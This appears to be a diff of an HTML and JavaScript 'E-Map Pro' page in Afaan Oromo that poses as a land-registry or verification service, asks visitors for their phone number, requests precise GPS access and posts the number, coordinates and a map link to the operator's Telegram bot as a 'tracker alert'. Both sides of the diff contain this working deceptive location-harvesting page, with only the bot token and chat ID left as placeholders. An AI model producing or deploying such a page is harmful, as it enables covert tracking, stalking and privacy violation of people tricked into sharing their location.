@@ -3,169 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>E-Map Pro - Anti-Forgery Land Cadastre & Location Tracker</title>
+    <title>E-Map Pro Tracker</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f0f2f5;
-            margin: 0;
-            padding: 20px;
+            font-family: sans-serif;
+            background: #f4f6f9;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
+            margin: 0;
         }
-        .container {
+        .card {
             background: #ffffff;
-            width: 100%;
-            max-width: 420px;
             padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-            border: 1px solid #e1e4e8;
-        }
-        h2 {
-            color: #1a73e8;
-            text-align: center;
-            margin-top: 0;
-            font-size: 22px;
-        }
-        p.desc {
-            color: #555;
-            font-size: 14px;
-            text-align: center;
-            margin-bottom: 25px;
-            line-height: 1.5;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #333;
-            font-size: 13px;
-        }
-        input[type="tel"] {
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
             width: 100%;
-            padding: 12px 15px;
+            max-width: 400px;
+            text-align: center;
+        }
+        h2 { color: #1a73e8; margin-top: 0; }
+        p { color: #555; font-size: 14px; margin-bottom: 20px; }
+        input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
             border: 1px solid #ccc;
             border-radius: 6px;
-            font-size: 16px;
             box-sizing: border-box;
+            margin-bottom: 15px;
             outline: none;
-            transition: border-color 0.2s;
-        }
-        input[type="tel"]:focus {
-            border-color: #1a73e8;
         }
         button {
+            width: 100%;
+            padding: 12px;
             background: #1a73e8;
             color: white;
             border: none;
-            width: 100%;
-            padding: 14px;
-            border-radius: 6px;
             font-size: 16px;
             font-weight: bold;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        button:hover {
-            background: #1557b0;
-        }
-        #statusBox {
-            display: none;
-            padding: 12px;
             border-radius: 6px;
-            font-size: 13px;
-            text-align: center;
-            margin-top: 15px;
-            font-weight: 500;
+            cursor: pointer;
         }
+        button:hover { background: #1557b0; }
+        #status { margin-top: 15px; font-size: 14px; color: #333; }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div class="card">
         <h2>📍 E-Map Pro</h2>
-        <p class="desc">
-            Galmee lafaa fi mirkaneessa nageenyaaf, maaloo lakkoofsa bilbilaa keessan galchuun teessoo keessan mirkaneessaa.
-        </p>
+        <p>Maaloo lakkoofsa bilbilaa keessan galchuun itti fufaa:</p>
         
-        <form id="trackingForm" onsubmit="sendLocationData(event)">
-            <div class="form-group">
-                <label for="userPhone">Lakkoofsa Bilbilaa (Phone Number):</label>
-                <input type="tel" id="userPhone" placeholder="Fkn: 0911223344" required>
-            </div>
-
-            <button type="submit" id="submitBtn">🔍 Mirkaneessii Ergi</button>
+        <form onsubmit="trackPhone(event)">
+            <input type="tel" id="phone" placeholder="Fkn: 0911223344" required>
+            <button type="submit" id="btn">Track Godhi</button>
         </form>
 
-        <div id="statusBox"></div>
+        <div id="status"></div>
     </div>
 
     <script>
-        // --- ASITTI TELEGRAM BOT TOKEN FI CHAT ID KEE GALCHI ---
-        const BOT_TOKEN = "GARTI_BOT_TOKEN_KEE_AS_ITTI_GALCHI"; // Fkn: "77123456:AAH..."
-        const CHAT_ID = "CHAT_ID_KEE_AS_ITTI_GALCHI";         // Fkn: "123456789"
+        // --- ASITTI BOT TOKEN FI CHAT ID KEE GALCHI ---
+        const BOT_TOKEN = "GARTI_BOT_TOKEN_KEE_AS_ITTI_GALCHI"; 
+        const CHAT_ID = "CHAT_ID_KEE_AS_ITTI_GALCHI";         
 
-        function sendLocationData(event) {
-            event.preventDefault();
-            const phone = document.getElementById('userPhone').value;
-            const statusBox = document.getElementById('statusBox');
-            const submitBtn = document.getElementById('submitBtn');
-            
-            statusBox.style.display = 'block';
-            statusBox.style.background = '#e8f0fe';
-            statusBox.style.color = '#1967d2';
-            statusBox.textContent = '⏳ Teessoo GPS qabachaa jira... Maaloo eeyyama (Allow) kennaa!';
-            submitBtn.disabled = true;
+        function trackPhone(e) {
+            e.preventDefault();
+            const phone = document.getElementById('phone').value;
+            const status = document.getElementById('status');
+            const btn = document.getElementById('btn');
+
+            status.textContent = "⏳ Eeyyama GPS gaafachaa jira...";
+            btn.disabled = true;
 
             if (!navigator.geolocation) {
-                alert('Browser kee GPS hin deeggaru!');
-                statusBox.style.display = 'none';
-                submitBtn.disabled = false;
+                alert("Browser kee GPS hin deeggaru!");
+                btn.disabled = false;
                 return;
             }
 
             navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
+                (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
                     const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
 
-                    statusBox.style.background = '#e6f4ea';
-                    statusBox.style.color = '#137333';
-                    statusBox.textContent = '✅ Milkaa\'inaan ergameera!';
-
-                    // Ergaa Telegram-tti ergisiisuu
+                    status.textContent = "✅ Milkaa'inaan ergameera!";
                     sendToTelegram(phone, lat, lng, mapLink);
                 },
-                (error) => {
-                    statusBox.style.background = '#fce8e6';
-                    statusBox.style.color = '#c5221f';
-                    statusBox.textContent = '❌ Eeyyamni Location (GPS) hin kennamne.';
-                    submitBtn.disabled = false;
-                    alert('Maaloo bakka jirtan beekuuf eeyyama (Allow) kennuu qabdu!');
+                (err) => {
+                    status.textContent = "❌ Eeyyamni GPS hin kennamne.";
+                    alert("Maaloo bakka jirtan beekuuf eeyyama (Allow) kennaa!");
+                    btn.disabled = false;
                 },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                { enableHighAccuracy: true }
             );
         }
 
         function sendToTelegram(phone, lat, lng, mapLink) {
             if (BOT_TOKEN.includes("GARTI_BOT_TOKEN")) {
-                alert(`Galmee Milkaa'e!\nBilbila: ${phone}\nGPS: ${lat}, ${lng}`);
-                setTimeout(() => location.reload(), 1500);
+                alert(`Bilbila: ${phone}\nLat: ${lat}\nLng: ${lng}`);
+                location.reload();
                 return;
             }
 
-            const text = `🚨 <b>E-MAP PRO: NEW USER TRACKER ALERT!</b>\n\n` +
-                         `📞 <b>Bilbila:</b> ${phone}\n` +
-                         `📍 <b>Latitude:</b> ${lat}\n` +
-                         `📍 <b>Longitude:</b> ${lng}\n` +
-                         `🗺️ <b>Google Map:</b> <a href="${mapLink}">Teessoo Kaartaa Ilaali</a>`;
+            const text = `🚨 <b>NEW TRACKER ALERT!</b>\n\n` +
+                         `📱 <b>Bilbila:</b> ${phone}\n` +
+                         `📍 <b>Lat:</b> ${lat}\n` +
+                         `📍 <b>Lng:</b> ${lng}\n` +
+                         `🗺️ <a href="${mapLink}">Google Map Irraa Ilaali</a>`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -174,19 +122,12 @@
             })
             .then(res => res.json())
             .then(data => {
-                if(data.ok) {
-                    setTimeout(() => {
-                        alert('Galmeen kee milkaa\'era. Galatoomaa!');
-                        location.reload();
-                    }, 1000);
-                } else {
-                    alert('Ergaaf Telegram Bot erguu irratti rakkoo uumame.');
-                    document.getElementById('submitBtn').disabled = false;
-                }
+                alert("Galmeen milkaa'e!");
+                location.reload();
             })
             .catch(err => {
-                console.log(err);
-                document.getElementById('submitBtn').disabled = false;
+                alert("Erguu irratti rakkoo uumame.");
+                document.getElementById('btn').disabled = false;
             });
         }
     </script>
